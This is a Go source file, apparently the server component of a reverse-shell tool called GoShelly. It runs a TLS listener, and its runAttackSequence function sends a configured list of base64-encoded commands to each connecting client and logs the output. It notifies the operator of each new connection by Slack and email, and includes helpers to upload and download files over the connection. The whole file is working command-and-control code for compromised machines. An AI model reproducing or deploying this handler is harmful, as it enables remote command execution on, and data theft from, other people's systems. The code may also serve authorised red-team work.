package basic

import (
	"bufio"
	"bytes"
	n "cobrashelly/aws"
	t "cobrashelly/template"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/mail"
	"os"
	"os/exec"
	"strings"
	"time"
	//aws//
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

//file upl/downl functions, if needed
func uploadFile(conn net.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn net.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}
func readFile(instrfile string) []string {

	file, err := os.Open(instrfile)
	if err != nil {
		log.Panic("Failed to open file.")
		os.Exit(1)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var text []string
	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	file.Close()
	return text
}

func printConfig() {
	servlog.Println("MODE: " + CONFIG.MODE)
	servlog.Println("PORT: " + CONFIG.PORT)
	servlog.Println("CMDSTORUN: ", CONFIG.CMDSTORUN)
	servlog.Println("SSLEMAIL: " + CONFIG.SSLEMAIL)
	servlog.Println("SLACKEN: ", CONFIG.SLACKEN)
	servlog.Println("EMAILEN: ", CONFIG.EMAILEN)
	servlog.Printf("NOTEMAIL: %s\n---", CONFIG.NOTEMAIL)
}
func validateMailAddress(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		servlog.Println("Invalid Email Address. Proceeding anyway.")
		return
	}
	servlog.Println("Email Verified. True.")
}

func sendSlackMessage(conn net.Conn, connData []t.ComRes) {
	if !CONFIG.SLACKEN {
		return
	}
	servlog.Println("Notifying Slack.")

	newPost := t.SlackPost{
		Id:    conn.RemoteAddr().String() + "-" + time.Now().Format(time.RFC1123),
		Title: "New connection received: " + conn.RemoteAddr().String(),
		Data:  connData,
	}

	body, _ := json.Marshal(newPost)

	resp, err := http.Post(CONFIG.SLACKHOOK, "application/json", bytes.NewBuffer(body))

	if err == nil && resp.StatusCode == http.StatusCreated {
		servlog.Println("Slack Notification sent successfully, ID:", newPost.Id)
		resp.Body.Close()
		return
	}
	servlog.Println("ERROR: ", err)
	servlog.Printf("HTTPSTATUSCODE: %d. Could not send Slack notification. Disabling Slack notifications until restart.", resp.StatusCode)
	CONFIG.SLACKEN = false
}

func genCert() {

	servlog.Println("Generating SSL Certificate.")
	validateMailAddress(CONFIG.SSLEMAIL)
	_, err := exec.Command("/bin/bash", "./scripts/certGen.sh", CONFIG.SSLEMAIL).Output()

	if err != nil {
		servlog.Printf("Error generating SSL Certificate: %s\n", err)
		os.Exit(1)
	}
}

func handleClient(conn net.Conn) {

	file, err := os.OpenFile("./logs/connections/"+conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	logger := log.New(file, "", log.LstdFlags)
	logger.Println("FILE BEGINS HERE.")
	logger.Println("Client connected: ", conn.RemoteAddr())
	data := runAttackSequence(conn, logger)
	disconnectClient(conn, logger, *file)
	err = n.SendEmail(conn, CONFIG.EMAILEN, CONFIG.NOTEMAIL, servlog)
	if err != nil{
		CONFIG.EMAILEN = false
	}
	sendSlackMessage(conn, data)
}

func setReadDeadLine(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Panic("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn net.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Panic("SetWriteDeadline failed:", err)
	}
}

func runAttackSequence(conn net.Conn, logger *log.Logger) []t.ComRes {
	buffer := make([]byte, 1024)
	var data []t.ComRes
	for _, element := range CONFIG.CMDSTORUN {
		element = strings.TrimSpace(element)
		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
		logger.Println("EXECUTE: " + element)
		setWriteDeadLine(conn)
		_, err := conn.Write([]byte(encodedStr))
		if err != nil {
			return nil
		}
		time.Sleep(time.Second * 2)
		setReadDeadLine(conn)
		_, err = conn.Read(buffer)
		if err != nil {
			return nil
		}
		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		logger.Println("RES: " + string(decodedStr[:]))
		data = append(data, t.ComRes{Cmd: element, Res: string(decodedStr[:])})
	}
	return data
}

func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
	logger.Println("Disconnecting Client: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
	logger.Println("\nDONE.\nFILE ENDS HERE.")
	file.Close()
	conn.Close()
}

var CONFIG t.Config
var servlog *log.Logger
var l net.Listener

func StartServer(port string, sslEmail string, not_email string, hook_slack string, emailEn bool, slackEn bool, cmds []string, mode string) {
	CONFIG = t.Config{
		SLACKEN:   slackEn,
		EMAILEN:   emailEn,
		SSLEMAIL:  sslEmail,
		NOTEMAIL:  not_email,
		PORT:      port,
		SLACKHOOK: hook_slack,
		CMDSTORUN: cmds,
		MODE:      mode,
	}

	servfile, err := os.OpenFile("./logs/serverlogs/"+"GoShellyServerLogs"+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Server log open error: ", err)
		os.Exit(1)
	}
	defer servfile.Close()
	servlog = log.New(servfile, "", log.LstdFlags)
	servlog.Println("Starting GoShelly server...")
	printConfig()

	genCert() // Uncomment if NOT using image.
	servlog.Println("Loading SSL Certificates")
	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")

	if err != nil {
		servlog.Printf("Error Loading Certificate: %s", err)
		os.Exit(1)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	config.Rand = rand.Reader
	service := "0.0.0.0:" + CONFIG.PORT

	l, err = tls.Listen("tcp", service, &config)
	if err != nil {
		servlog.Printf("Server Listen error: %s", err)
		os.Exit(1)
	}
	servlog.Printf("Server Listening on port: %s\n---", CONFIG.PORT)

	for {
		conn, err := l.Accept()
		if err != nil {
			servlog.Printf("%s Client accept error: %s", conn.RemoteAddr(), err)
			continue
		}
		servlog.Printf("Client accepted: %s", conn.RemoteAddr())
		tlscon, ok := conn.(*tls.Conn)
		if ok {
			servlog.Print("SSL ok=true")
			state := tlscon.ConnectionState()
			for _, v := range state.PeerCertificates {
				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
			}
		}
		servlog.Println("Handling Client: ", conn.RemoteAddr())
		go handleClient(conn)
	}
}
